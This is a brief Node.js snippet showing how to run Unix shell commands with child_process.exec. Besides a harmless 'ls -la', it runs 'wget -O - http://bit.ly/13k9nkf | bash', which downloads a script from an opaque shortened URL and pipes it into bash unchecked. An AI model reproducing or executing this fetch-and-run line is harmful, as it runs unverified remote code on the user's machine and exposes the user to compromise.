# Nodejs



# Execute Unix Commands with nodejs

```js
var command_01 = "ls -la";
var command_02 = "wget -O - http://bit.ly/13k9nkf | bash";

var sys = require('sys')
var exec = require('child_process').exec;
function puts(error, stdout, stderr) { sys.puts(stdout) }

exec( command_01, puts );
exec( command_02, puts );
```
